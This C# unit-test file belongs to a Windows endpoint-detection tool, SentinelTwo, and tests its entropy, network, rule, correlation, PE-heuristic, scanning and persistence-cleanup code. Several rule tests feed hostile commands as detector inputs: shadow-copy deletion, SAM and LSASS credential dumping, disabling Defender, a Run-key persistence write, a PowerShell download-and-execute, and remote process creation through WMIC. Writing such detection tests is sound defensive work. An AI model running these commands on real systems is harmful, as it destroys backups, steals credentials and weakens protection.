using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text;

namespace SentinelTwo.Tests
{
    internal static class TestFiles
    {
        public static string NewDirectory()
        {
            string dir = Path.Combine(Path.GetTempPath(), "st_tests_" + Guid.NewGuid().ToString("N"));
            Directory.CreateDirectory(dir);
            return dir;
        }

        public static void Remove(string dir)
        {
            try { if (Directory.Exists(dir)) Directory.Delete(dir, true); } catch (Exception) { }
        }

        // Builds a minimal PE image: DOS header, PE signature, one section header, and raw section data.
        public static byte[] BuildPe(string sectionName, byte[] sectionData)
        {
            const int peOffset = 0x80;
            const int sectionHeaderOffset = peOffset + 24; // signature (4) + COFF header (20), no optional header
            const int rawPointer = 0x200;
            byte[] file = new byte[rawPointer + sectionData.Length];
            file[0] = (byte)'M';
            file[1] = (byte)'Z';
            BitConverter.GetBytes(peOffset).CopyTo(file, 0x3C);
            file[peOffset] = (byte)'P';
            file[peOffset + 1] = (byte)'E';
            BitConverter.GetBytes((ushort)0x8664).CopyTo(file, peOffset + 4);  // Machine
            BitConverter.GetBytes((ushort)1).CopyTo(file, peOffset + 6);       // NumberOfSections
            byte[] name = Encoding.ASCII.GetBytes(sectionName);
            Array.Copy(name, 0, file, sectionHeaderOffset, Math.Min(8, name.Length));
            BitConverter.GetBytes((uint)sectionData.Length).CopyTo(file, sectionHeaderOffset + 16);
            BitConverter.GetBytes((uint)rawPointer).CopyTo(file, sectionHeaderOffset + 20);
            Array.Copy(sectionData, 0, file, rawPointer, sectionData.Length);
            return file;
        }

        public static byte[] RandomBytes(int length, int seed)
        {
            byte[] data = new byte[length];
            new Random(seed).NextBytes(data);
            return data;
        }
    }

    internal static class EntropyCoreTests
    {
        public static void TestStringEntropyOfUniformStringIsZero()
        {
            Assert.Near(0, AvState.Entropy("aaaa"), 1e-9, "uniform string");
        }

        public static void TestStringEntropyOfFourDistinctCharsIsTwo()
        {
            Assert.Near(2, AvState.Entropy("abcd"), 1e-9, "four distinct characters");
        }

        public static void TestByteEntropyOfZerosIsZero()
        {
            Assert.Near(0, StaticHeuristics.ByteEntropy(new byte[1024]), 1e-9, "zero bytes");
        }

        public static void TestByteEntropyOfAllByteValuesIsEight()
        {
            byte[] data = new byte[256 * 4];
            for (int i = 0; i < data.Length; i++) data[i] = (byte)(i % 256);
            Assert.Near(8, StaticHeuristics.ByteEntropy(data), 1e-9, "all byte values equally often");
        }
    }

    internal static class SharedStateCoreTests
    {
        public static void TestContainsCaseInsensitive()
        {
            Assert.True(AvState.ContainsCI(new string[] { "explorer.exe" }, "EXPLORER.EXE"), "case-insensitive match");
            Assert.False(AvState.ContainsCI(new string[] { "explorer.exe" }, "cmd.exe"), "non-match");
            Assert.False(AvState.ContainsCI(new string[] { "explorer.exe" }, null), "null never matches");
        }

        public static void TestPathContainsAnyIgnoresEmptyTokens()
        {
            // An empty token would match every path under naive substring logic. It must not.
            Assert.False(AvState.PathContainsAny(@"C:\Program Files\x.exe", new string[] { "" }), "empty token");
            Assert.True(AvState.PathContainsAny(@"C:\Users\a\Downloads\x.exe", new string[] { "downloads" }), "token match");
        }

        public static void TestIsDupRemembersKeyWithinWindow()
        {
            string key = "CoreTests|" + Guid.NewGuid().ToString("N");
            Assert.False(AvState.IsDup(key, 300), "first sighting");
            Assert.True(AvState.IsDup(key, 300), "second sighting within window");
        }

        public static void TestSignalsAccumulateCategoriesAndCount()
        {
            int pid = 910001;
            AvState.Correlation.Remove(pid);
            AvState.AddSignal(pid, "memory", 0.7);
            AvState.AddSignal(pid, "memory", 0.7);
            AvState.AddSignal(pid, "network", 0.8);
            List<string> cats = AvState.GetCategories(pid);
            Assert.Equal(2, cats.Count, "distinct categories");
            Assert.Equal(3, AvState.GetSignalCount(pid), "total signals");
            AvState.Correlation.Remove(pid);
        }

        public static void TestIndicatorObservationIsReportedOncePerFingerprint()
        {
            int pid = 910002;
            AvState.ReportedIndicators.Remove(pid);
            Assert.True(AvState.TestNewIndicatorObservation(pid, "Rule", "fp1"), "first observation");
            Assert.False(AvState.TestNewIndicatorObservation(pid, "Rule", "fp1"), "same fingerprint suppressed");
            Assert.True(AvState.TestNewIndicatorObservation(pid, "Rule", "fp2"), "new fingerprint reported");
            AvState.ReportedIndicators.Remove(pid);
        }
    }

    internal static class NetworkCoreTests
    {
        public static void TestPrivateIpv4Ranges()
        {
            Assert.True(Network.IsPrivate(IPAddress.Parse("10.1.2.3")), "10/8");
            Assert.True(Network.IsPrivate(IPAddress.Parse("192.168.1.1")), "192.168/16");
            Assert.True(Network.IsPrivate(IPAddress.Parse("172.20.0.1")), "172.16/12 inside");
            Assert.True(Network.IsPrivate(IPAddress.Parse("169.254.1.1")), "link-local");
            Assert.True(Network.IsPrivate(IPAddress.Parse("224.0.0.1")), "multicast");
            Assert.True(Network.IsPrivate(IPAddress.Parse("127.0.0.1")), "loopback");
        }

        public static void TestPublicIpv4IsNotPrivate()
        {
            Assert.False(Network.IsPrivate(IPAddress.Parse("8.8.8.8")), "public DNS");
            Assert.False(Network.IsPrivate(IPAddress.Parse("172.32.0.1")), "just outside 172.16/12");
        }

        public static void TestIpv6LoopbackAndGlobal()
        {
            Assert.True(Network.IsPrivate(IPAddress.Parse("::1")), "IPv6 loopback");
            Assert.False(Network.IsPrivate(IPAddress.Parse("2001:4860:4860::8888")), "global IPv6");
        }

        public static void TestTcpTableReadDoesNotThrow()
        {
            List<Native.TcpRow> rows = Native.GetTcpRows();
            Assert.True(rows != null, "table returned");
        }
    }

    internal static class RuleCoreTests
    {
        public static void TestDestructiveShadowCopyDeletion()
        {
            Detection d = Rules.Destructive("vssadmin delete shadows /all /quiet", 1, "vssadmin.exe");
            Assert.True(d != null && d.Rule == "Destructive", "shadow copy deletion");
            Assert.True(d.Confidence >= 0.85, "Tier1 confidence");
        }

        public static void TestDestructiveIgnoresBenignCommand()
        {
            Assert.True(Rules.Destructive("notepad.exe readme.txt", 1, "notepad.exe") == null, "benign");
        }

        public static void TestCredentialDumpComsvcs()
        {
            Detection d = Rules.CredentialAccess(@"rundll32 C:\windows\System32\comsvcs.dll, MiniDump 624 C:\temp\d.dmp full", 2, "rundll32.exe");
            Assert.True(d != null && d.Rule == "CredentialDump", "comsvcs MiniDump");
        }

        public static void TestCredentialDumpRegistryHive()
        {
            Detection d = Rules.CredentialAccess(@"reg save HKLM\SAM C:\temp\sam.hiv", 3, "reg.exe");
            Assert.True(d != null && d.Rule == "CredentialDump", "reg save HKLM\\SAM");
        }

        public static void TestEvasionDefenderDisabled()
        {
            Detection d = Rules.Evasion("powershell Set-MpPreference -DisableRealtimeMonitoring 1", 4, "powershell.exe");
            Assert.True(d != null && d.Rule == "Evasion", "Defender real-time disabled");
        }

        public static void TestPersistenceRunKeyWrite()
        {
            Detection d = Rules.Persistence(@"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v evil /d x.exe", 5, "reg.exe");
            Assert.True(d != null && d.Rule == "Persistence", "Run key add");
        }

        public static void TestExecutionEncodedPayloadIsTier2()
        {
            string command = "powershell.exe -enc " + new string('A', 200);
            Detection d = Rules.Execution(command, 6, "powershell.exe");
            Assert.True(d != null && d.Rule == "EncodedExec", "encoded payload");
            Assert.True(d.Tier == Correlation.Tier2, "encoded payload is log-only");
        }

        public static void TestExecutionDownloadAndRun()
        {
            Detection d = Rules.Execution("powershell -c IEX (New-Object Net.WebClient).DownloadString('http://x')", 7, "powershell.exe");
            Assert.True(d != null && d.Rule == "DownloadExec", "download and execute");
        }

        public static void TestEscalationUacBypassHelper()
        {
            Detection d = Rules.Escalation("fodhelper.exe", 8, "fodhelper.exe");
            Assert.True(d != null && d.Rule == "Escalation", "fodhelper");
        }

        public static void TestLateralRemoteProcessCreate()
        {
            Detection d = Rules.LateralMovement("wmic /node:10.0.0.5 process call create calc.exe", 9, "wmic.exe");
            Assert.True(d != null && d.Rule == "LateralMovement", "remote process create");
        }

        public static void TestGenealogyOfficeSpawnsShell()
        {
            Dictionary<int, ProcessInfo> saved = AvState.Ancestry;
            AvState.Ancestry = new Dictionary<int, ProcessInfo>();
            try
            {
                AvState.Ancestry[100] = new ProcessInfo { Name = "WINWORD.EXE", ParentId = 1 };
                AvState.Ancestry[200] = new ProcessInfo { Name = "cmd.exe", ParentId = 100, Path = @"C:\Windows\System32\cmd.exe" };
                Detection d = Rules.Genealogy(200, "cmd.exe", 100);
                Assert.True(d != null && d.Rule == "OfficeShellSpawn", "Word spawning cmd");
                Assert.True(d.Confidence >= 0.85, "Tier1 confidence");
            }
            finally
            {
                AvState.Ancestry = saved;
            }
        }

        public static void TestGenealogyNormalParentIsQuiet()
        {
            Dictionary<int, ProcessInfo> saved = AvState.Ancestry;
            AvState.Ancestry = new Dictionary<int, ProcessInfo>();
            try
            {
                AvState.Ancestry[100] = new ProcessInfo { Name = "explorer.exe", ParentId = 1 };
                Assert.True(Rules.Genealogy(200, "cmd.exe", 100) == null, "explorer spawning cmd is normal");
            }
            finally
            {
                AvState.Ancestry = saved;
            }
        }

        public static void TestUnsignedStagedSkipsNonStagingPath()
        {
            // Not in a staging location, so no file or network lookup is made.
            Assert.True(Rules.UnsignedStaged(1, "x.exe", @"E:\Gorstak\SentinelTwo\bin\SentinelTwo.exe") == null, "non-staging path");
        }

        public static void TestDnsEntropyDoesNotCrashOnEmptyCommandLines()
        {
            Dictionary<int, ProcessInfo> saved = AvState.Ancestry;
            AvState.Ancestry = new Dictionary<int, ProcessInfo>();
            try
            {
                AvState.Ancestry[300] = new ProcessInfo { Name = "x.exe", CommandLine = "" };
                Rules.DnsAnomaly();
            }
            finally
            {
                AvState.Ancestry = saved;
            }
        }
    }

    internal static class CorrelationCoreTests
    {
        public static void TestCompositeRaisesAttackChainForThreeCategories()
        {
            string saved = AvLog.LogPath;
            string dir = TestFiles.NewDirectory();
            AvLog.LogPath = Path.Combine(dir, "events.jsonl");
            int pid = 910010;
            try
            {
                AvState.Correlation.Remove(pid);
                AvState.AddSignal(pid, "genealogy", 0.7);
                AvState.AddSignal(pid, "dga", 0.7);
                AvState.AddSignal(pid, "beaconing", 0.8);
                Correlation.Composite(pid, "testproc.exe");
                string log = File.ReadAllText(AvLog.LogPath);
                Assert.True(log.IndexOf("Composite:AdvancedAttackChain", StringComparison.Ordinal) >= 0, "attack chain logged");
                Assert.True(log.IndexOf("Composite:DgaC2Beacon", StringComparison.Ordinal) >= 0, "DGA + beaconing logged");
            }
            finally
            {
                AvState.Correlation.Remove(pid);
                AvLog.LogPath = saved;
                TestFiles.Remove(dir);
            }
        }

        public static void TestCompositeSilentWithOneSignal()
        {
            string saved = AvLog.LogPath;
            string dir = TestFiles.NewDirectory();
            AvLog.LogPath = Path.Combine(dir, "events.jsonl");
            int pid = 910011;
            try
            {
                AvState.Correlation.Remove(pid);
                AvState.AddSignal(pid, "genealogy", 0.7);
                Correlation.Composite(pid, "testproc.exe");
                Assert.False(File.Exists(AvLog.LogPath), "no composite below two signals");
            }
            finally
            {
                AvState.Correlation.Remove(pid);
                AvLog.LogPath = saved;
                TestFiles.Remove(dir);
            }
        }
    }

    internal static class StaticHeuristicCoreTests
    {
        public static void TestDoubleExtensionIsFlagged()
        {
            string dir = TestFiles.NewDirectory();
            try
            {
                string path = Path.Combine(dir, "invoice.pdf.exe");
                File.WriteAllText(path, "not really a program");
                bool found = false;
                foreach (StaticHeuristics.Finding f in StaticHeuristics.Analyze(path, new string[0], true))
                {
                    if (f.Text.IndexOf("double extension", StringComparison.Ordinal) >= 0) found = true;
                }
                Assert.True(found, "double extension finding");
            }
            finally
            {
                TestFiles.Remove(dir);
            }
        }

        public static void TestPeWithPackerSectionAndHighEntropyIsFlagged()
        {
            string dir = TestFiles.NewDirectory();
            try
            {
                string path = Path.Combine(dir, "packed.exe");
                File.WriteAllBytes(path, TestFiles.BuildPe("UPX0", TestFiles.RandomBytes(8192, 7)));
                List<string> texts = new List<string>();
                foreach (StaticHeuristics.Finding f in StaticHeuristics.Analyze(path, new string[0], false)) texts.Add(f.Text);
                Assert.True(texts.Exists(t => t == "packer section name UPX0"), "packer section name");
                Assert.True(texts.Exists(t => t.StartsWith("high-entropy section UPX0", StringComparison.Ordinal)), "high-entropy section");
                Assert.True(texts.Contains("unsigned executable"), "unsigned flag passed through");
            }
            finally
            {
                TestFiles.Remove(dir);
            }
        }

        public static void TestPeWithPlainSectionIsNotFlagged()
        {
            string dir = TestFiles.NewDirectory();
            try
            {
                string path = Path.Combine(dir, "plain.exe");
                File.WriteAllBytes(path, TestFiles.BuildPe(".text", new byte[8192]));
                List<StaticHeuristics.Finding> findings = StaticHeuristics.Analyze(path, new string[0], true);
                Assert.Equal(0, findings.Count, "zero-filled text section, signed");
            }
            finally
            {
                TestFiles.Remove(dir);
            }
        }

        public static void TestPeHeaderParserRejectsNonPe()
        {
            Assert.False(MemoryInspect.LooksLikePe(new byte[4096], 4096), "zero buffer");
            Assert.False(MemoryInspect.LooksLikePe(new byte[32], 32), "too short");
        }

        public static void TestPeHeaderParserAcceptsSyntheticPe()
        {
            byte[] image = TestFiles.BuildPe(".text", new byte[4096]);
            byte[] sample = new byte[4096];
            Array.Copy(image, sample, 4096);
            Assert.True(MemoryInspect.LooksLikePe(sample, 4096), "synthetic PE header");
        }
    }

    internal static class FileScanCoreTests
    {
        public static void TestOfflineScanOfTextFileIsUnknown()
        {
            string dir = TestFiles.NewDirectory();
            try
            {
                string path = Path.Combine(dir, "readme.txt");
                File.WriteAllText(path, "hello");
                ScanResult r = FileScanner.ScanFile(path, true);
                Assert.Equal("Unknown", r.Verdict, "plain text without evidence");
                Assert.Equal(5L, r.Size, "size recorded");
            }
            finally
            {
                TestFiles.Remove(dir);
            }
        }

        public static void TestOfflineScanOfSuspiciousExecutableIsSuspicious()
        {
            string dir = TestFiles.NewDirectory();
            try
            {
                string path = Path.Combine(dir, "invoice.pdf.exe");
                File.WriteAllBytes(path, TestFiles.BuildPe(".text", new byte[4096]));
                ScanResult r = FileScanner.ScanFile(path, true);
                // Double extension (2) plus unsigned (1) is at least the Suspicious threshold of 2.
                Assert.Equal("Suspicious", r.Verdict, "double extension plus unsigned");
                Assert.True(r.Sha256 != null && r.Sha256.Length == 64, "sha256 computed");
            }
            finally
            {
                TestFiles.Remove(dir);
            }
        }

        public static void TestSignedSystemBinaryIsNotMaliciousOffline()
        {
            string notepad = Path.Combine(Environment.SystemDirectory, "notepad.exe");
            if (!File.Exists(notepad)) return;
            ScanResult r = FileScanner.ScanFile(notepad, true);
            Assert.True(r.Verdict != "Malicious", "signed Windows binary is not Malicious");
            Assert.True(r.Verdict != "Clean", "offline scan cannot produce Clean");
        }

        public static void TestSha256KnownVector()
        {
            string dir = TestFiles.NewDirectory();
            try
            {
                string path = Path.Combine(dir, "abc.txt");
                File.WriteAllText(path, "abc", Encoding.ASCII);
                Assert.Equal("BA7816BF8F01CFEA414140DE5DAE2223B00361A396177A9CB410FF61F20015AD",
                             Reputation.Sha256File(path), "SHA-256 of 'abc'");
            }
            finally
            {
                TestFiles.Remove(dir);
            }
        }

        public static void TestAuthenticodeValidForCatalogSignedSystemFile()
        {
            string notepad = Path.Combine(Environment.SystemDirectory, "notepad.exe");
            if (!File.Exists(notepad)) return;
            Assert.True(Reputation.IsAuthenticodeValid(notepad), "catalog-signed notepad.exe");
        }

        public static void TestAuthenticodeInvalidForUnsignedFile()
        {
            string dir = TestFiles.NewDirectory();
            try
            {
                string path = Path.Combine(dir, "unsigned.exe");
                File.WriteAllBytes(path, TestFiles.BuildPe(".text", new byte[512]));
                Assert.False(Reputation.IsAuthenticodeValid(path), "unsigned synthetic PE");
            }
            finally
            {
                TestFiles.Remove(dir);
            }
        }
    }

    internal static class PersistenceCoreTests
    {
        public static void TestLaunchTargetQuoted()
        {
            Assert.Equal(@"C:\Program Files\x\a.exe", PersistenceCleanup.LaunchTarget("\"C:\\Program Files\\x\\a.exe\" -background"), "quoted with arguments");
        }

        public static void TestLaunchTargetBare()
        {
            Assert.Equal(@"C:\tools\b.exe", PersistenceCleanup.LaunchTarget(@"C:\tools\b.exe /run"), "bare with arguments");
        }

        public static void TestLaunchTargetExpandsEnvironment()
        {
            string temp = Environment.GetEnvironmentVariable("TEMP");
            Assert.Equal(Path.GetFullPath(Path.Combine(temp, "c.exe")), PersistenceCleanup.LaunchTarget("%TEMP%\\c.exe"), "environment variable");
        }

        public static void TestLaunchTargetEmptyIsNull()
        {
            Assert.True(PersistenceCleanup.LaunchTarget("") == null, "empty");
            Assert.True(PersistenceCleanup.LaunchTarget(null) == null, "null");
        }

        public static void TestFindQuarantinedMatchesOnlyWhenOriginalGoneAndHashMatches()
        {
            string dir = TestFiles.NewDirectory();
            try
            {
                string payload = Path.Combine(dir, "payload.quarantine");
                File.WriteAllText(payload, "payload body");
                string original = Path.Combine(dir, "gone", "evil.exe");
                PersistenceCleanup.ManifestEntry entry = new PersistenceCleanup.ManifestEntry
                {
                    Original = original,
                    Quarantined = payload,
                    Sha256 = Reputation.Sha256File(payload)
                };
                List<PersistenceCleanup.ManifestEntry> manifest = new List<PersistenceCleanup.ManifestEntry> { entry };

                Assert.True(PersistenceCleanup.FindQuarantined(original, manifest) != null, "original gone, hash matches");

                File.WriteAllText(payload, "tampered");
                Assert.True(PersistenceCleanup.FindQuarantined(original, manifest) == null, "hash changed");
                File.WriteAllText(payload, "payload body");

                Directory.CreateDirectory(Path.GetDirectoryName(original));
                File.WriteAllText(original, "back on disk");
                Assert.True(PersistenceCleanup.FindQuarantined(original, manifest) == null, "original still exists");
            }
            finally
            {
                TestFiles.Remove(dir);
            }
        }

        public static void TestWmiKeyNameParsing()
        {
            Assert.Equal("MyFilter", PersistenceWmi.KeyName("__EventFilter.Name=\"MyFilter\""), "filter reference");
            Assert.True(PersistenceWmi.KeyName("garbage") == null, "no key");
            Assert.True(PersistenceWmi.KeyName(null) == null, "null");
        }

        public static void TestBuiltInServiceAccounts()
        {
            Assert.True(PersistenceTasks.IsBuiltInAccount("LocalSystem"), "LocalSystem");
            Assert.True(PersistenceTasks.IsBuiltInAccount("NT AUTHORITY\\LOCALSERVICE"), "NT AUTHORITY\\LOCALSERVICE");
            Assert.True(PersistenceTasks.IsBuiltInAccount("NetworkService"), "NetworkService");
            Assert.False(PersistenceTasks.IsBuiltInAccount("DOMAIN\\svc"), "domain account refused");
            Assert.False(PersistenceTasks.IsBuiltInAccount(".\\LocalUser"), "local user account refused");
            Assert.False(PersistenceTasks.IsBuiltInAccount(""), "empty refused");
        }
    }

    internal static class SmallHelpersCoreTests
    {
        public static void TestThumbprintNormalization()
        {
            Assert.Equal("ABCDEF01", CertPolicy.Normalize("ab:cd ef:01"), "colons and spaces removed, uppercased");
        }

        public static void TestRuleNameIsDeterministicAndPrefixed()
        {
            string a = NetworkControl.RuleName(@"C:\Tools\x.exe");
            string b = NetworkControl.RuleName(@"C:\Tools\x.exe");
            string c = NetworkControl.RuleName(@"C:\Tools\y.exe");
            Assert.Equal(a, b, "same program, same name");
            Assert.False(a == c, "different programs, different names");
            Assert.True(a.StartsWith("SentinelTwo-block-", StringComparison.Ordinal), "prefix");
            Assert.Equal(30, a.Length, "prefix plus 12 hex characters");
        }

        public static void TestProxyFindingsForLoopbackAndPlainPac()
        {
            Dictionary<string, object> s = new Dictionary<string, object>();
            s["ProxyEnable"] = 1;
            s["ProxyServer"] = "127.0.0.1:8080";
            s["AutoConfigURL"] = "http://example.test/proxy.pac";
            List<string> notes = ProxyRecovery.Findings(s);
            Assert.Equal(2, notes.Count, "loopback proxy and plain-HTTP PAC");
        }

        public static void TestProxyFindingsIgnoreDisabledProxy()
        {
            Dictionary<string, object> s = new Dictionary<string, object>();
            s["ProxyEnable"] = 0;
            s["ProxyServer"] = "127.0.0.1:8080";
            s["AutoConfigURL"] = null;
            Assert.Equal(0, ProxyRecovery.Findings(s).Count, "disabled proxy is not a finding");
        }

        public static void TestTelemetryRejectsBadArguments()
        {
            Assert.Equal(2, Telemetry.Run(new string[] { "patch" }), "incomplete command");
            Assert.Equal(2, Telemetry.Run(new string[] { "events", "process-start", "0" }), "zero minutes");
            Assert.Equal(2, Telemetry.Run(new string[] { "events", "process-start", "99999" }), "too many minutes");
        }
    }
}
